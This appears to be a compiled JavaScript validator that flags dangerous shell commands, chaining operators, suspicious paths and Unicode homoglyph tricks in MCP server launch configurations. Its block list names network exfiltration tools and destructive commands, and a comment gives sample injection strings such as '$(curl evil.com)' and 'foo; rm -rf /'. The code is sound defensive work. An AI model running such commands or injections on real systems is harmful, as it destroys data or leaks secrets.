import { parse as shellParse } from 'shell-quote';
/** Legitimate MCP launchers — not flagged when used as the root command */
const MCP_LAUNCHERS = new Set(['node', 'nodejs', 'npx', 'python', 'python3', 'uv', 'uvx', 'deno']);
// Tier-1: Commands that should never appear in an MCP server invocation
const DANGEROUS_COMMANDS = new Set([
    'rm', 'rmdir', 'shred', 'dd', // destructive
    'curl', 'wget', 'nc', 'netcat', // network exfil
    'chmod', 'chown', 'sudo', 'su', // privilege escalation
    'bash', 'sh', 'zsh', 'fish', 'dash', // shell spawning
    'exec', 'eval', 'source', '.', // code execution
    'mkfifo', 'mknod', // IPC/device tricks
    'ruby', 'perl', 'php', 'lua', 'tclsh',
    'crontab', 'at', 'atq', // persistence
    'passwd', 'useradd', 'usermod', // account manipulation
    'iptables', 'ufw', 'pfctl', // firewall tampering
    'mount', 'umount', // filesystem manipulation
    'openssl', 'gpg', // crypto abuse
    'env', 'printenv', // env var leakage
    'export', 'set', 'unset', // env manipulation
]);
// Tier-2: Structural shell operators (indicate chaining/injection)
const DANGEROUS_OPERATORS = new Set(['|', '||', '&&', ';', '&', '`', '$(', '${', '>', '>>', '<', '<<']);
// Tier-3: Suspicious path patterns
const SUSPICIOUS_PATH_PATTERNS = [
    /\.\.[\/\\]/, // path traversal
    /^[\/\\]etc[\/\\]/, // /etc access
    /^[\/\\]proc\//, // /proc access
    /^[\/\\]sys\//, // /sys access
    /~\//, // home dir expansion
];
/**
 * True AST-based analysis using shell-quote tokenizer.
 * shell-quote correctly handles quoting, escaping, and expansions.
 *
 * Why this is better than regex:
 *   - "r\u006d -rf /" → regex misses it; shell-quote normalizes to ["rm", "-rf", "/"]
 *   - "foo; rm -rf /" → regex might miss if pattern is anchored; AST sees the semicolon node
 *   - "$(curl evil.com)" → regex hits pattern in string; AST surfaces the $ substitution operator
 */
export function validateCommand(command, args = []) {
    const threats = [];
    const rootCommand = command.trim().split(/\s+/)[0]?.toLowerCase() ?? '';
    // Normalise unicode homoglyphs BEFORE tokenizing
    const normalised = normaliseHomoglyphs(command + ' ' + args.join(' '));
    let tokens;
    try {
        tokens = shellParse(normalised);
    }
    catch {
        // Parse failure is itself suspicious (malformed shell)
        threats.push({
            type: 'operator-injection',
            severity: 'high',
            detail: 'Command string failed shell parsing (possible obfuscation)',
            token: command,
        });
        return { safe: false, threats };
    }
    for (const token of tokens) {
        if (typeof token === 'string') {
            // Plain word token — check if it's a dangerous command
            const word = token.toLowerCase();
            const isRootLauncher = word === rootCommand && MCP_LAUNCHERS.has(word);
            if (DANGEROUS_COMMANDS.has(word) && !isRootLauncher) {
                threats.push({
                    type: 'dangerous-command',
                    severity: 'critical',
                    detail: `Dangerous command "${word}" detected in MCP server invocation`,
                    token: token,
                });
            }
            // Check path traversal
            for (const pat of SUSPICIOUS_PATH_PATTERNS) {
                if (pat.test(token)) {
                    threats.push({
                        type: 'path-traversal',
                        severity: 'high',
                        detail: `Suspicious path pattern in token "${token}"`,
                        token: token,
                    });
                }
            }
        }
        else if (typeof token === 'object' && token !== null) {
            // Operator node (|, &&, ;, etc.)
            const op = token.op;
            if (op && DANGEROUS_OPERATORS.has(op)) {
                threats.push({
                    type: 'operator-injection',
                    severity: 'critical',
                    detail: `Shell operator "${op}" detected — possible command injection`,
                    token: op,
                });
            }
        }
    }
    return { safe: threats.length === 0, threats };
}
/**
 * Normalise common Unicode homoglyphs to ASCII equivalents.
 * Handles attacks like using the Cyrillic 'с' (U+0441) in place of 'c'.
 */
function normaliseHomoglyphs(input) {
    const MAP = {
        '\u0441': 'c', // Cyrillic с → c
        '\u0430': 'a', // Cyrillic а → a
        '\u0435': 'e', // Cyrillic е → e
        '\u2212': '-', // minus sign → hyphen
        '\u2215': '/', // division slash → forward slash
        '\u2216': '\\', // set minus → backslash
        '\uFF0F': '/', // fullwidth solidus → /
        '\uFF3C': '\\', // fullwidth reverse solidus
        '\u200B': '', // zero-width space (remove)
        '\u200C': '', // zero-width non-joiner (remove)
        '\u200D': '', // zero-width joiner (remove)
        '\uFEFF': '', // BOM (remove)
    };
    const pattern = new RegExp(`[${Object.keys(MAP).join('')}]`, 'g');
    return input.replace(pattern, (ch) => MAP[ch] ?? ch);
}
/**
 * CommandValidator class — maintains backward-compatible interface
 * with existing security-scanner.ts consumers.
 */
export class CommandValidator {
    validate(serverConfig) {
        const command = serverConfig.command ?? '';
        const args = serverConfig.args || [];
        // HTTP/SSE-only configs may omit command — not a security finding
        if (!command.trim()) {
            return [];
        }
        const result = validateCommand(command, args);
        return result.threats.map(t => ({
            type: t.type,
            severity: t.severity,
            message: t.detail,
            token: t.token,
        }));
    }
}
//# sourceMappingURL=command-validator.js.map